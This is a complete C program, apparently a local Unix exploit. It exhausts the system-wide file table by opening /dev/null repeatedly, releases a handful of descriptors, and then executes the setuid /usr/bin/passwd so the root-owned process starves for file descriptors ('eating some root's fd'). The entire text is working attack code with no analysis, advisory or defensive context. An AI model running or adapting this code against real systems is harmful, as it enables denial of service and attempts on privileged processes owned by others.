#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>



#define PREFORK 1
#define EXECBIN "/usr/bin/passwd"
#define FREENUM 18


static int fc = 0;
static int ec = 0;



void forkmore(int v)
{
    fc++;
}


void execmore(int v)
{
    ec++;
}


int main()
{
    int r, cn, pt[PREFORK];


    signal(SIGUSR1, &forkmore);
    signal(SIGUSR2, &execmore);
    printf("\n");

    for (cn = 0; cn < PREFORK; cn++) {
	if (!(r = fork())) {
	    printf("\npreforked child %d", cn);
	    fflush(stdout);
	    while (!ec) {
		usleep(100000);
	    }

	    printf("\nexecuting %s\n", EXECBIN);
	    fflush(stdout);

	    execl(EXECBIN, EXECBIN, NULL);

	    printf("\nwhat the fuck?");
	    fflush(stdout);
	    while (1)
		sleep(999999);
	    exit(1);
	} else
	    pt[cn] = r;
    }

    sleep(1);
    printf("\n\n");
    fflush(stdout);
    cn = 0;

    while (1) {
	fc = ec = 0;
	cn++;

	if (!(r = fork())) {
	    int cnt = 0, fd = 0, ofd = 0;

	    while (1) {
		ofd = fd;
		fd = open("/dev/null", O_RDWR);
		if (fd < 0) {
		    printf("errno %d ", errno);
		    printf("pid %d got %d files\n", getpid(), cnt);
		    fflush(stdout);

		    if (errno == ENFILE)
			kill(getppid(), SIGUSR2);
		    else
			kill(getppid(), SIGUSR1);

		    break;
		} else
		    cnt++;
	    }

	    ec = 0;

	    while (1) {
		usleep(100000);
		if (ec) {
		    printf("\nfreeing some file descriptors...\n");
		    fflush(stdout);
		    for (cn = 0; cn < FREENUM; cn++) {
			printf("\n pid %d closing %d", getpid(), ofd);
			close(ofd--);
		    }
		    ec = 0;
		    kill(getppid(), SIGUSR2);
		}
	    }

	} else {
	    while (!ec && !fc)
		usleep(100000);

	    if (ec) {
		printf("\n\nfile limit reached, eating some root's fd");
		fflush(stdout);

		sleep(1);
		ec = 0;
		kill(r, SIGUSR2);
		while (!ec)
		    sleep(1);

		for (cn = 0; cn < PREFORK; cn++)
		    kill(pt[cn], SIGUSR2);

		while (1) {
		    sleep(999999);
		}
	    }
	}
    }

    return 0;
}
